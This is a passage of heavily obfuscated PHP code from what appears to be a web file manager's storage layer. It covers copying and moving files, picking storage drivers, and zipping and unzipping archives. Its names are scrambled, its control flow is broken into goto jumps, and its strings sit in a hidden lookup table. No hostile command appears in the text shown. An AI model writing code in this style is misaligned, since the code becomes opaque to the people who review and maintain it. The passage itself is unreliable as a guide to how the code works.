$CíÂ›Ì­, $bš¯ÜöÕµø[746]); } } return $d«âÒ›ƒÄ¥; goto C÷¤®‰ÔŒ¨; aÜãº”‡¤…: if ($f££ßöÙŒ«) { if (!$A¹¥•Ù•½ê->exist($CíÂ›Ì­)) { $Aøß÷ÙŸ›² = $A¹¥•Ù•½ê->getPathName($A¹¥•Ù•½ê->pathThis($CíÂ›Ì­)); $CíÂ›Ì­ = $A¹¥•Ù•½ê->pathFather($CíÂ›Ì­); } return self::copyFile($a©¦Ğ™£Ì®, $EêÎ±ôÖàæ, $A¹¥•Ù•½ê, $CíÂ›Ì­, $Aøß÷ÙŸ›², $Eºî“šÀ…„); } if ($E×¯¨áÂ£ß == REPEAT_RENAME_FOLDER) { $E×¯¨áÂ£ß = !1; } $D‘ŒÌÏóÓ = rtrim($CíÂ›Ì­, $bš¯ÜöÕµø[8]) . $bš¯ÜöÕµø[8] . $Aøß÷ÙŸ›²; goto d›¦ˆ «ä†; d›¦ˆ «ä†: $d«âÒ›ƒÄ¥ = $A¹¥•Ù•½ê->mkdir($A¹¥•Ù•½ê->getPath($D‘ŒÌÏóÓ)); $CíÂ›Ì­ = $A¹¥•Ù•½ê->getPathInner($d«âÒ›ƒÄ¥); $BŠÙ³¿ƒ£ = $a©¦Ğ™£Ì®->listPath($EêÎ±ôÖàæ, !1, !0); goto BÀ‚¯Éñ‹ˆ; C÷¤®‰ÔŒ¨: } private static function copyFile($a†İÇ‹†…, $AÜÅí‘óšÑ, $fğ“îÜÉì , $Bóç¡×¥‘ñ, $a¹¢–³éß’, $e‡ ÇäÀù) { goto FˆÄí¥Õãá; Aëµ×Áõ‡: $D¯Úˆ‡‰àÙ = $a†İÇ‹†…->iconvApp($D¯Úˆ‡‰àÙ); $FµÌÌ§ãŠ = $fğ“îÜÉì ->upload($Bóç¡×¥‘ñ, $D¯Úˆ‡‰àÙ, $e‡ ÇäÀù); del_file($BÔŸğÃª¢† . $dôÍ¤ŸÀß); goto båÛ¡ Õ½Ş; FˆÄí¥Õãá: $D§ ¯¢âğ =& $_SERVER[İåâé¾]; $Bóç¡×¥‘ñ = $fğ“îÜÉì ->getPath(rtrim($Bóç¡×¥‘ñ, $D§ ¯¢âğ[8]) . $D§ ¯¢âğ[8] . $a¹¢–³éß’); $dôÍ¤ŸÀß = $D§ ¯¢âğ[747] . time() . rand_string(5); goto c¿”óÛâ«©; båÛ¡ Õ½Ş: Hook::trigger($D§ ¯¢âğ[749], $a†İÇ‹†…, $AÜÅí‘óšÑ, $fğ“îÜÉì , $Bóç¡×¥‘ñ, $a¹¢–³éß’, $FµÌÌ§ãŠ); return $FµÌÌ§ãŠ; goto F¶ô¼ÃôØ¿; aĞÓâí¶Û: mk_dir($BÔŸğÃª¢†); $D¯Úˆ‡‰àÙ = $BÔŸğÃª¢† . $dôÍ¤ŸÀß; $D¯Úˆ‡‰àÙ = $a†İÇ‹†…->download($AÜÅí‘óšÑ, $D¯Úˆ‡‰àÙ); goto Aëµ×Áõ‡; c¿”óÛâ«©: Hook::trigger($D§ ¯¢âğ[748], $a†İÇ‹†…, $AÜÅí‘óšÑ, $fğ“îÜÉì , $Bóç¡×¥‘ñ, $a¹¢–³éß’, $dôÍ¤ŸÀß); if (self::driverIsSame($a†İÇ‹†…, $fğ“îÜÉì )) { if ($e‡ ÇäÀù) { $FµÌÌ§ãŠ = $fğ“îÜÉì ->moveFile($AÜÅí‘óšÑ, $Bóç¡×¥‘ñ); } else { $FµÌÌ§ãŠ = $fğ“îÜÉì ->copyFile($AÜÅí‘óšÑ, $Bóç¡×¥‘ñ); } Hook::trigger($D§ ¯¢âğ[749], $a†İÇ‹†…, $AÜÅí‘óšÑ, $fğ“îÜÉì , $Bóç¡×¥‘ñ, $a¹¢–³éß’, $FµÌÌ§ãŠ); return $FµÌÌ§ãŠ; } $BÔŸğÃª¢† = TEMP_FILES; goto aĞÓâí¶Û; F¶ô¼ÃôØ¿: } public static function fileOut($Bª»‡œöÓ, $FŸª¬±ôãº = false, $Dä‹›í©ï‰ = false, $A•£™æ‹Ú = '') { $FÀ¼óˆ›áÒ =& $_SERVER[İåâé¾]; $FÆÎ­÷‡²— = self::driverMake($Bª»‡œöÓ); $aÍÑ˜¬Ÿ× = $GLOBALS[$FÀ¼óˆ›áÒ[6]][$FÀ¼óˆ›áÒ[84]][$FÀ¼óˆ›áÒ[750]]; if ($aÍÑ˜¬Ÿ×) { return $FÆÎ­÷‡²—->fileOutServer($Bª»‡œöÓ, $FŸª¬±ôãº, $Dä‹›í©ï‰, $A•£™æ‹Ú); } return $FÆÎ­÷‡²—->fileOut($Bª»‡œöÓ, $FŸª¬±ôãº, $Dä‹›í©ï‰, $A•£™æ‹Ú); } public function fileOutImage($CÕ´°ƒŠà², $f‡ˆ˜ŞÕÜ‰ = 250) { $céŒÂ¾Š«• =& $_SERVER[İåâé¾]; $a¥ãÆõ¶„™ = self::driverMake($CÕ´°ƒŠà²); $b·ŒÅŠƒğ = $GLOBALS[$céŒÂ¾Š«•[6]][$céŒÂ¾Š«•[84]][$céŒÂ¾Š«•[750]]; if ($b·ŒÅŠƒğ) { return $a¥ãÆõ¶„™->fileOutImageServer($CÕ´°ƒŠà², $f‡ˆ˜ŞÕÜ‰); } return $a¥ãÆõ¶„™->fileOutImage($CÕ´°ƒŠà², $f‡ˆ˜ŞÕÜ‰); } private static function driverIsSame($cÙ‹Ôñ¦÷µ, $B¼è´‚—Œ¾) { goto d”á‹Üˆ§ê; d”á‹Üˆ§ê: $FàŠŒÇ³ÃÚ =& $_SERVER[İåâé¾]; $E¼—È¼¡¼Õ = $cÙ‹Ôñ¦÷µ->getType(); $bÛÍ“…éÀî = $B¼è´‚—Œ¾->getType(); goto eÉ¶²‹šíÚ; eÉ¶²‹šíÚ: if ($E¼—È¼¡¼Õ != $bÛÍ“…éÀî) { return !1; } if ($E¼—È¼¡¼Õ == $FàŠŒÇ³ÃÚ[451]) { return !0; } if ($E¼—È¼¡¼Õ == $FàŠŒÇ³ÃÚ[100]) { return !0; } goto Còˆè¡¶À¿; Còˆè¡¶À¿: if ($cÙ‹Ôñ¦÷µ->pathDriver == $B¼è´‚—Œ¾->pathDriver) { return !0; } return !1; goto bÔäéáÅ‹; bÔäéáÅ‹: } public static function copyUpdate($f‡·¸£›Ï×, $C•ù×¥ÛØ×) { goto dáïä‹¤È; eŸ®İ‰ïÓ¸: $DÜ†êÔ¶¢Ğ = array(); foreach ($c©Á«‰İ‘ as $d×ĞµÓâÜ˜ => $Eåİ¢ÂÂÌÓ) { if ($Eåİ¢ÂÂÌÓ[$f¢«ö»Ï»¹[77]] == 1 && !isset($b·š®»î²[$d×ĞµÓâÜ˜])) { $DÜ†êÔ¶¢Ğ[] = $C•ù×¥ÛØ× . $f¢«ö»Ï»¹[8] . $d×ĞµÓâÜ˜; } if ($Eåİ¢ÂÂÌÓ[$f¢«ö»Ï»¹[77]] == 0) { if (!isset($b·š®»î²[$d×ĞµÓâÜ˜]) || $b·š®»î²[$d×ĞµÓâÜ˜][$f¢«ö»Ï»¹[78]] != $Eåİ¢ÂÂÌÓ[$f¢«ö»Ï»¹[78]]) { $b´Œ˜ÌÓÄø[] = array($f¢«ö»Ï»¹[751] => $Eåİ¢ÂÂÌÓ[$f¢«ö»Ï»¹[76]], $f¢«ö»Ï»¹[752] => $C•ù×¥ÛØ× . $f¢«ö»Ï»¹[8] . get_path_father($d×ĞµÓâÜ˜), $f¢«ö»Ï»¹[753] => $Eåİ¢ÂÂÌÓ); if (isset($b·š®»î²[$d×ĞµÓâÜ˜])) { IO::remove($C•ù×¥ÛØ× . $f¢«ö»Ï»¹[8] . $d×ĞµÓâÜ˜); } } } } $b÷õ£óíË‡ = array($f¢«ö»Ï»¹[163] => $b´Œ˜ÌÓÄø, $f¢«ö»Ï»¹[77] => $DÜ†êÔ¶¢Ğ); goto BÕÄå¡¶ò; BÕÄå¡¶ò: Hook::trigger($f¢«ö»Ï»¹[754], $f‡·¸£›Ï×, $C•ù×¥ÛØ×, $b÷õ£óíË‡); foreach ($DÜ†êÔ¶¢Ğ as $Eåİ¢ÂÂÌÓ) { IO::mkdir($Eåİ¢ÂÂÌÓ); } foreach ($b´Œ˜ÌÓÄø as $Eåİ¢ÂÂÌÓ) { IO::copy($Eåİ¢ÂÂÌÓ[$f¢«ö»Ï»¹[751]], $Eåİ¢ÂÂÌÓ[$f¢«ö»Ï»¹[752]], REPEAT_REPLACE); } goto BÓáš®µˆá; D¶­À•—Éº: $c©Á«‰İ‘ = self::_listAll($f‡·¸£›Ï×); $b·š®»î² = self::_listAll($C•ù×¥ÛØ×); $b´Œ˜ÌÓÄø = array(); goto eŸ®İ‰ïÓ¸; dáïä‹¤È: $f¢«ö»Ï»¹ =& $_SERVER[İåâé¾]; if (!IO::exist($f‡·¸£›Ï×)) { return !1; } if (!IO::exist($C•ù×¥ÛØ×)) { IO::mkdir($C•ù×¥ÛØ×); } goto D¶­À•—Éº; BÓáš®µˆá: } private static function _listAll($FÈ‚ÒîĞäî) { $AÖÎõªˆ ¶ =& $_SERVER[İåâé¾]; $FÈ‚ÒîĞäî = KodIO::clear($FÈ‚ÒîĞäî); $F‰¤µå‡¯ = IO::listAll($FÈ‚ÒîĞäî); foreach ($F‰¤µå‡¯ as &$bØˆóÌÑí) { $FÔÖ½À¯†Ğ = substr($bØˆóÌÑí[$AÖÎõªˆ ¶[76]], strlen($FÈ‚ÒîĞäî)); $bØˆóÌÑí[$AÖÎõªˆ ¶[755]] = trim($FÔÖ½À¯†Ğ, $AÖÎõªˆ ¶[8]); } return array_to_keyvalue($F‰¤µå‡¯, $AÖÎõªˆ ¶[755]); } private static function driverMake(&$cÄÊñ‹˜Ì¤) { goto fô‚õåÂ…¬; a„¥åÂ†À§: return $B–Ú‚ôå‘; goto bÜÅ‘ÔâÁ‰; B–ÛƒĞ…Í: if ($D„ äÒŠŞâ[$E‚»ÔŠöÒª[29]] == KodIO::KOD_IO && !self::$driverListSystem[$D„ äÒŠŞâ[$E‚»ÔŠöÒª[368]]]) { return !1; } $cÄÊñ‹˜Ì¤ = $D„ äÒŠŞâ[$E‚»ÔŠöÒª[756]]; $B–Ú‚ôå‘ = self::driverGet($D„ äÒŠŞâ, $cÄÊñ‹˜Ì¤); goto a„¥åÂ†À§; fô‚õåÂ…¬: $E‚»ÔŠöÒª =& $_SERVER[İåâé¾]; $D„ äÒŠŞâ = KodIO::parse($cÄÊñ‹˜Ì¤); if (!self::$driverListSystem) { $DñÍÛªĞ© = Model($E‚»ÔŠöÒª[461])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($DñÍÛªĞ©, $E‚»ÔŠöÒª[368]); } goto B–ÛƒĞ…Í; bÜÅ‘ÔâÁ‰: } private static function driverGet($B§’ÅËöÏÒ, &$bæÆ«ªÂºï) { goto eÅ‡šèèÄ; B…ìÁ¸©ïÒ: if (isset($Câì¦ÕŞë­[$Aåª„ß†ÒË[6]][$Aåª„ß†ÒË[769]])) { $e…ò¥î¬ù->pathBase = rtrim($Câì¦ÕŞë­[$Aåª„ß†ÒË[6]][$Aåª„ß†ÒË[769]], $Aåª„ß†ÒË[8]) . $Aåª„ß†ÒË[8]; $bæÆ«ªÂºï = $e…ò¥î¬ù->pathBase . ltrim($bæÆ«ªÂºï, $Aåª„ß†ÒË[8]); } $bæÆ«ªÂºï = $e…ò¥î¬ù->getPath($bæÆ«ªÂºï); if (isset($B§’ÅËöÏÒ[$Aåª„ß†ÒË[742]])) { $bæÆ«ªÂºï = $B§’ÅËöÏÒ[$Aåª„ß†ÒË[742]]; } goto CäÌŒòÃÒ«; CäÌŒòÃÒ«: $e…ò¥î¬ù->path = $bæÆ«ªÂºï; return $e…ò¥î¬ù; goto Aìñô‘ç; DÄ”Œ‘Î†î: $e…ò¥î¬ù = self::$driverCache[$DÅæêóÊ¬]; $e…ò¥î¬ù->pathDriver = $EÜ…¬–½¿”; $e…ò¥î¬ù->pathBase = $Aåª„ß†ÒË[33]; goto B…ìÁ¸©ïÒ; eÅ‡šèèÄ: $Aåª„ß†ÒË =& $_SERVER[İåâé¾]; $EÜ…¬–½¿” = $B§’ÅËöÏÒ[$Aåª„ß†ÒË[757]]; $d¶°×¦ÂÊ = $B§’ÅËöÏÒ[$Aåª„ß†ÒË[368]]; goto e¹ñì¾½×˜; e¹ñì¾½×˜: switch ($B§’ÅËöÏÒ[$Aåª„ß†ÒË[29]]) { case KodIO::KOD_IO: $Câì¦ÕŞë­ = self::$driverListSystem[$d¶°×¦ÂÊ]; break; case KodIO::KOD_SOURCE: $bæÆ«ªÂºï = $d¶°×¦ÂÊ . $bæÆ«ªÂºï; $Câì¦ÕŞë­ = array($Aåª„ß†ÒË[758] => $Aåª„ß†ÒË[759], $Aåª„ß†ÒË[6] => $B§’ÅËöÏÒ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $b›¿¦‰ƒ³ = $GLOBALS[$Aåª„ß†ÒË[760]]; self::$driverListUser = array_to_keyvalue($b›¿¦‰ƒ³, $Aåª„ß†ÒË[368]); } $Câì¦ÕŞë­ = self::$driverListUser[$d¶°×¦ÂÊ]; break; case KodIO::KOD_SHARE_LINK: $Câì¦ÕŞë­ = array($Aåª„ß†ÒË[758] => $Aåª„ß†ÒË[761], $Aåª„ß†ÒË[6] => $B§’ÅËöÏÒ); $aÛÜ¹«ñ¥ = Action($Aåª„ß†ÒË[762])->sharePathInfo($B§’ÅËöÏÒ[$Aåª„ß†ÒË[76]]); $bæÆ«ªÂºï = $aÛÜ¹«ñ¥[$Aåª„ß†ÒË[374]]; if (!$aÛÜ¹«ñ¥[$Aåª„ß†ÒË[374]]) { $bŒùÌï«» = Model($Aåª„ß†ÒË[418])->getInfo($aÛÜ¹«ñ¥[$Aåª„ß†ÒË[419]]); $bæÆ«ªÂºï = KodIO::clear($bŒùÌï«»[$Aåª„ß†ÒË[763]] . $B§’ÅËöÏÒ[$Aåª„ß†ÒË[756]]); $B§’ÅËöÏÒ[$Aåª„ß†ÒË[764]] = $bŒùÌï«»; $B§’ÅËöÏÒ[$Aåª„ß†ÒË[742]] = $bæÆ«ªÂºï; $Câì¦ÕŞë­ = array($Aåª„ß†ÒË[758] => $Aåª„ß†ÒË[765], $Aåª„ß†ÒË[6] => $B§’ÅËöÏÒ); } break; case KodIO::KOD_SHARE_ITEM: $Câì¦ÕŞë­ = array($Aåª„ß†ÒË[758] => $Aåª„ß†ÒË[766], $Aåª„ß†ÒË[6] => $B§’ÅËöÏÒ); $bŒùÌï«» = Model($Aåª„ß†ÒË[418])->getInfo($B§’ÅËöÏÒ[$Aåª„ß†ÒË[368]]); if ($bŒùÌï«»[$Aåª„ß†ÒË[374]] == $Aåª„ß†ÒË[402]) { $bæÆ«ªÂºï = KodIO::clear($bŒùÌï«»[$Aåª„ß†ÒË[763]] . $B§’ÅËöÏÒ[$Aåª„ß†ÒË[756]]); $B§’ÅËöÏÒ[$Aåª„ß†ÒË[764]] = $bŒùÌï«»; $B§’ÅËöÏÒ[$Aåª„ß†ÒË[742]] = $bæÆ«ªÂºï; $Câì¦ÕŞë­ = array($Aåª„ß†ÒË[758] => $Aåª„ß†ÒË[767], $Aåª„ß†ÒË[6] => $B§’ÅËöÏÒ); } break; default: $bæÆ«ªÂºï = $B§’ÅËöÏÒ[$Aåª„ß†ÒË[76]]; $Câì¦ÕŞë­ = array($Aåª„ß†ÒË[758] => $Aåª„ß†ÒË[768]); break; } $DÅæêóÊ¬ = $B§’ÅËöÏÒ[$Aåª„ß†ÒË[76]]; if (!isset(self::$driverCache[$DÅæêóÊ¬])) { $B’ö¦á¥ùø = $Aåª„ß†ÒË[72] . self::driverType($Câì¦ÕŞë­[$Aåª„ß†ÒË[89]]); if (!class_exists($B’ö¦á¥ùø)) { show_json("{$B’ö¦á¥ùø}\x20\156\x6f\164\x20\145\170\151\x73\x74\x73\x21", !1); } $Eµ¯ßÃÌ = isset($Câì¦ÕŞë­[$Aåª„ß†ÒË[6]]) ? $Câì¦ÕŞë­[$Aåª„ß†ÒË[6]] : !1; self::$driverCache[$DÅæêóÊ¬] = new $B’ö¦á¥ùø($Eµ¯ßÃÌ); } goto DÄ”Œ‘Î†î; Aìñô‘ç: } private static function driverType($d„æô§‡æ·) { $DÛ÷Êç®Œ =& $_SERVER[İåâé¾]; $d„æô§‡æ· = strtolower($d„æô§‡æ·); if ($d„æô§‡æ· == $DÛ÷Êç®Œ[65]) { $d„æô§‡æ· = $DÛ÷Êç®Œ[770]; } else { if (in_array($d„æô§‡æ·, array($DÛ÷Êç®Œ[100], $DÛ÷Êç®Œ[58], $DÛ÷Êç®Œ[771]))) { $d„æô§‡æ· = ucfirst($d„æô§‡æ·); } else { $d„æô§‡æ· = strtoupper($d„æô§‡æ·); } } return $d„æô§‡æ·; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $BçÆÂŠÑ˜; if (!$BçÆÂŠÑ˜) { $cÙÔ±ˆ‚Å = IO::init($_SERVER[İåâé¾][8]); } return $cÙÔ±ˆ‚Å; } private static function iconvSystem($C‡†ñî÷’¬) { return self::local()->iconvSystem($C‡†ñî÷’¬); } private static function iconvApp($dò…‚öÑÈ…) { return self::local()->iconvApp($dò…‚öÑÈ…); } public static function zip($Aã‹ğíÀõÇ, $D¹ìœ¿º¼ = "\172\x69\160", $aùñœ…Û = '', $bªï¤”Ïø¥ = REPEAT_RENAME) { goto B¿‰ŠÂĞÊ; A‡æô©òªë: if ($aùñœ…Û || !$fé«ÈÃÑÁ³) { if ($fé«ÈÃÑÁ³ && strstr($fé«ÈÃÑÁ³, TEMP_FILES)) { $dÕëí¶„Šõ = $F´Ê¸íìÕ = array(); recursion_dir($cÔÎ—õË, $dÕëí¶„Šõ, $F´Ê¸íìÕ, 0); foreach ($dÕëí¶„Šõ as $BÌŸ“î…™Ÿ) { del_dir($BÌŸ“î…™Ÿ); } foreach ($F´Ê¸íìÕ as $cå£»Ù£ˆ) { if ($cå£»Ù£ˆ == $aœì¼ï¼©ß) { continue; } del_file($cå£»Ù£ˆ); } } return $d¦•‚ÌÖ§; } $Bì†È¦Ø³ = self::pathFather($F¯Õã‡½çÙ[$FõÂš‰É‡[76]]); $Bì†È¦Ø³ = $D“Í¯éÃ™Ø->getPathOuter($D“Í¯éÃ™Ø->iconvSystem($Bì†È¦Ø³)); goto aÊœâ¾ƒô‹; B¿‰ŠÂĞÊ: $FõÂš‰É‡ =& $_SERVER[İåâé¾]; $D“Í¯éÃ™Ø = self::init($Aã‹ğíÀõÇ[0][$FõÂš‰É‡[76]]); $F¯Õã‡½çÙ = self::info($Aã‹ğíÀõÇ[0][$FõÂš‰É‡[76]]); goto d†µåôøä; cé·ˆ×ç£Õ: return $c©Ãã¹£ë°; goto Aß«Å“¾ë‡; A«Úãç‡ëÑ: $d¦•‚ÌÖ§ = $cÔÎ—õË . $fğÖ¼Æºöâ . $FõÂš‰É‡[90] . $D¹ìœ¿º¼; $d¦•‚ÌÖ§ = get_filename_auto($d¦•‚ÌÖ§, $FõÂš‰É‡[33], $bªï¤”Ïø¥); $aœì¼ï¼©ß = self::iconvSystem($d¦•‚ÌÖ§); goto bŒŸÈ…¶’•; d†µåôøä: $fé«ÈÃÑÁ³ = !1; if (!$aùñœ…Û && $D“Í¯éÃ™Ø->getType() == $FõÂš‰É‡[100]) { $F´Ê¸íìÕ = self::zipFileList($Aã‹ğíÀõÇ); } else { $fé«ÈÃÑÁ³ = $aùñœ…Û ? $aùñœ…Û : TEMP_FILES . $FõÂš‰É‡[772] . time() . rand_string(5) . $FõÂš‰É‡[8]; mk_dir($fé«ÈÃÑÁ³); $F´Ê¸íìÕ = self::zipFileList($Aã‹ğíÀõÇ, $fé«ÈÃÑÁ³); } $fğÖ¼Æºöâ = $F¯Õã‡½çÙ[$FõÂš‰É‡[28]]; goto cççÍĞïŞ; cççÍĞïŞ: if (count($F´Ê¸íìÕ) > 1) { $D¸¨Ï×½» = isset($F¯Õã‡½çÙ[$FõÂš‰É‡[773]]) ? $F¯Õã‡½çÙ[$FõÂš‰É‡[773]] : $F¯Õã‡½çÙ[$FõÂš‰É‡[76]]; $fğÖ¼Æºöâ = get_path_this(get_path_father($D¸¨Ï×½»)); } $cÔÎ—õË = $fé«ÈÃÑÁ³; if (!$cÔÎ—õË) { $cÔÎ—õË = get_path_father($F¯Õã‡½çÙ[$FõÂš‰É‡[76]]); $C–‹®¢¨ƒ› = IO::info($cÔÎ—õË); if (!$C–‹®¢¨ƒ›[$FõÂš‰É‡[188]]) { show_json(LNG($FõÂš‰É‡[774]), !1); } } goto A«Úãç‡ëÑ; bŒŸÈ…¶’•: foreach ($F´Ê¸íìÕ as $dÇõô±ªÁ => $DÆ‹÷Åä‹ ) { $F´Ê¸íìÕ[$dÇõô±ªÁ] = self::iconvSystem($DÆ‹÷Åä‹ ); } KodArchive::create($aœì¼ï¼©ß, $F´Ê¸íìÕ); if (!IO::exist($d¦•‚ÌÖ§)) { if ($fé«ÈÃÑÁ³) { del_dir($fé«ÈÃÑÁ³); } show_json(LNG($FõÂš‰É‡[775]), !1); } goto A‡æô©òªë; aÊœâ¾ƒô‹: $c©Ãã¹£ë° = self::move($d¦•‚ÌÖ§, $Bì†È¦Ø³, $bªï¤”Ïø¥); if (!$c©Ãã¹£ë°) { del_dir($fé«ÈÃÑÁ³); show_json(LNG($FõÂš‰É‡[775]), !1); } del_dir($fé«ÈÃÑÁ³); goto cé·ˆ×ç£Õ; Aß«Å“¾ë‡: } public static function unzip($fÂ˜ÜÜÃ½“, $EšÉ¢ÕŠÆ  = "\x72\145\x70\x6c\x61\x63\x65") { goto Aìò¸•ùñ; b³ÆË·ÓÄ÷: del_dir($E›„îáš¨Õ); if (!$cÌéÊˆÇ½) { del_file($e³Ú‹Î‘ë¤); } return !0; goto F™¸®Š‡•â; Aìò¸•ùñ: $bô¸©”‚ô =& $_SERVER[İåâé¾]; $E¿·ø¥´ÇÌ = $fÂ˜ÜÜÃ½“[$bô¸©”‚ô[76]]; $aùä×ã†Ù• = $fÂ˜ÜÜÃ½“[$bô¸©”‚ô[776]]; goto Aª¾ºİ„…¨; Aª¾ºİ„…¨: if (!($eŸ¨ª·É = parent::info($E¿·ø¥´ÇÌ))) { show_json(LNG($bô¸©”‚ô[777]), !1); } if (!($eÙ‘­¹ñ = parent::infoFull($aùä×ã†Ù•))) { $aùä×ã†Ù• = parent::mkdir($aùä×ã†Ù•); $eÙ‘­¹ñ = array($bô¸©”‚ô[76] => $aùä×ã†Ù•); } else { if (isset($eÙ‘­¹ñ[$bô¸©”‚ô[374]]) && trim($eÙ‘­¹ñ[$bô¸©”‚ô[76]], $bô¸©”‚ô[8]) != trim($aùä×ã†Ù•, $bô¸©”‚ô[8])) { $Ešæ‚Ïñƒ© = KodIO::make($eÙ‘­¹ñ[$bô¸©”‚ô[384]]); $D‘»¢³é› = parent::fileNameAuto($Ešæ‚Ïñƒ©, $eÙ‘­¹ñ[$bô¸©”‚ô[28]], REPEAT_RENAME_FOLDER, !0); $aùä×ã†Ù• = parent::mkdir($Ešæ‚Ïñƒ© . $D‘»¢³é›); $eÙ‘­¹ñ = array($bô¸©”‚ô[76] => $aùä×ã†Ù•); } } $aùä×ã†Ù• = $eÙ‘­¹ñ[$bô¸©”‚ô[76]]; goto eÓ©òäËİÏ; E¾ãº†…¬©: self::archiveExt(); if (!$fê«½æÆÅ½[$bô¸©”‚ô[780]]) { show_json($bô¸©”‚ô[781] . $fê«½æÆÅ½[$bô¸©”‚ô[782]], !1); } Hook::trigger($bô¸©”‚ô[783], $E›„îáš¨Õ); goto C›Ô°ËõÍç; a†‰‘é›»Î: $e³Ú‹Î‘ë¤ = self::iconvSystem($e³Ú‹Î‘ë¤); $a¶ç¬ƒà  = isset($fÂ˜ÜÜÃ½“[$bô¸©”‚ô[778]]) ? $fÂ˜ÜÜÃ½“[$bô¸©”‚ô[778]] : $bô¸©”‚ô[779]; $fê«½æÆÅ½ = KodArchive::extract($e³Ú‹Î‘ë¤, $E›„îáš¨Õ . $bô¸©”‚ô[8], $a¶ç¬ƒà ); goto E¾ãº†…¬©; B¾©í†×è¦: mk_dir($E›„îáš¨Õ); $e³Ú‹Î‘ë¤ = $E›„îáš¨Õ . $bô¸©”‚ô[90] . $eŸ¨ª·É[$bô¸©”‚ô[156]]; if (!@file_exists(self::iconvSystem($e³Ú‹Î‘ë¤))) { $cÌéÊˆÇ½ = self::localFilePath($E¿·ø¥´ÇÌ, $eŸ¨ª·É[$bô¸©”‚ô[156]]); $e³Ú‹Î‘ë¤ = $cÌéÊˆÇ½ ? $cÌéÊˆÇ½ : parent::download($E¿·ø¥´ÇÌ, $e³Ú‹Î‘ë¤); } goto a†‰‘é›»Î; C›Ô°ËõÍç: recursion_dir($E›„îáš¨Õ, $D™áåï¢…Î, $B…¬±ŒÙ±ù, 0); $DíÅÒ«È°– = array_merge($D™áåï¢…Î, $B…¬±ŒÙ±ù); foreach ($DíÅÒ«È°– as $C¬²¯˜„œ ) { $C¬²¯˜„œ  = self::iconvApp($C¬²¯˜„œ ); self::move($C¬²¯˜„œ , $aùä×ã†Ù•, $EšÉ¢ÕŠÆ ); } goto b³ÆË·ÓÄ÷; eÓ©òäËİÏ: $eÌîÉŠÏ‰æ = self::tmpFileName($eŸ¨ª·É); $E›„îáš¨Õ = TEMP_FILES . $eÌîÉŠÏ‰æ; del_dir($E›„îáš¨Õ); goto B¾©í†×è¦; F™¸®Š‡•â: } public function unzipList($D´ÅïÖ÷Ú×) { goto c ¥âğ¾¨Ô; FÂôÔğÔ²È: if ($Cäšæ¶ˆÇ“ >= 0) { $Aê‚‚¡µÊ = isset($D´ÅïÖ÷Ú×[$A³”Áˆ÷è¥[788]]) ? $D´ÅïÖ÷Ú×[$A³”Áˆ÷è¥[788]] : !1; $AÌ«†íÄÀ‹ = isset($D´ÅïÖ÷Ú×[$A³”Áˆ÷è¥[28]]) ? $D´ÅïÖ÷Ú×[$A³”Áˆ÷è¥[28]] : $A³”Áˆ÷è¥[33]; KodArchive::filePreview($FÆ„‹Ê¶ˆ‰, $Cäšæ¶ˆÇ“, $Aê‚‚¡µÊ, $AÌ«†íÄÀ‹); self::archiveExt(); die; } $D®‚¸ ¿µæ = KodArchive::listContent($FÆ„‹Ê¶ˆ‰); self::archiveExt(); goto cÂ¶éŒ°Ç; Dä½ÀÛÍ™Ô: self::setContent($e‚‡Û£½’, $fôéñŸçÌ); if (count($D®‚¸ ¿µæ[$A³”Áˆ÷è¥[782]]) >= $e¼ù‘ì„ˆ’) { show_json(sprintf(LNG($A³”Áˆ÷è¥[786]), count($D®‚¸ ¿µæ[$A³”Áˆ÷è¥[782]])), !1); } return $D®‚¸ ¿µæ[$A³”Áˆ÷è¥[782]]; goto e„´ÓÃŠ¯à; FÅ´ÛÖ‹œ: $FÆ„‹Ê¶ˆ‰ = $A–°Ì‚ê . $A³”Áˆ÷è¥[8] . $FÑ£áŒÃß‘; if (!@file_exists(self::iconvSystem($FÆ„‹Ê¶ˆ‰))) { if (isset($fÎŸø„Ğ¤)) { url_request($e‹°´‰Ÿí, $A³”Áˆ÷è¥[787], $FÆ„‹Ê¶ˆ‰); } else { $EŸíÆ«Î¡Ü = self::localFilePath($e‹°´‰Ÿí, $B·ŸòéÓ•“[$A³”Áˆ÷è¥[156]]); $FÆ„‹Ê¶ˆ‰ = $EŸíÆ«Î¡Ü ? $EŸíÆ«Î¡Ü : self::download($e‹°´‰Ÿí, $FÆ„‹Ê¶ˆ‰); } } $FÆ„‹Ê¶ˆ‰ = self::iconvSystem($FÆ„‹Ê¶ˆ‰); goto FÂôÔğÔ²È; c ¥âğ¾¨Ô: $A³”Áˆ÷è¥ =& $_SERVER[İåâé¾]; $e‹°´‰Ÿí = $D´ÅïÖ÷Ú×[$A³”Áˆ÷è¥[76]]; $Cäšæ¶ˆÇ“ = isset($D´ÅïÖ÷Ú×[$A³”Áˆ÷è¥[784]]) ? $D´ÅïÖ÷Ú×[$A³”Áˆ÷è¥[784]] : -1; goto e•¢Ãì¿Ë×; cÂ¶éŒ°Ç: del_dir($A–°Ì‚ê); if (!$D®‚¸ ¿µæ[$A³”Áˆ÷è¥[780]]) { show_json($D®‚¸ ¿µæ[$A³”Áˆ÷è¥[782]], !1); } $fôéñŸçÌ = json_encode($D®‚¸ ¿µæ[$A³”Áˆ÷è¥[782]]); goto Dä½ÀÛÍ™Ô; BÂ½ƒ“ËÊí: $B·ŸòéÓ•“ = self::info($CìÛ‹‚Û™š); $FÏÖš—÷è¨ = self::tmpFileName($B·ŸòéÓ•“); if (isset($fÎŸø„Ğ¤)) { $AŠ»ø¹´ß™ = array($fÎŸø„Ğ¤[$A³”Áˆ÷è¥[76]], $fÎŸø„Ğ¤[$A³”Áˆ÷è¥[784]], $fÎŸø„Ğ¤[$A³”Áˆ÷è¥[28]]); $FÑ£áŒÃß‘ = md5(implode($A³”Áˆ÷è¥[71], $AŠ»ø¹´ß™)) . $A³”Áˆ÷è¥[90] . get_path_ext($fÎŸø„Ğ¤[$A³”Áˆ÷è¥[28]]); } else { $AŠ»ø¹´ß™ = array($B·ŸòéÓ•“[$A³”Áˆ÷è¥[28]], $B·ŸòéÓ•“[$A³”Áˆ÷è¥[76]], $B·ŸòéÓ•“[$A³”Áˆ÷è¥[78]]); $FÑ£áŒÃß‘ = md5(implode($A³”Áˆ÷è¥[71], $AŠ»ø¹´ß™)) . $A³”Áˆ÷è¥[90] . $B·ŸòéÓ•“[$A³”Áˆ÷è¥[156]]; } goto d‹Óö¨ÀĞÜ; e•¢Ãì¿Ë×: $e¼ù‘ì„ˆ’ = 50000; if 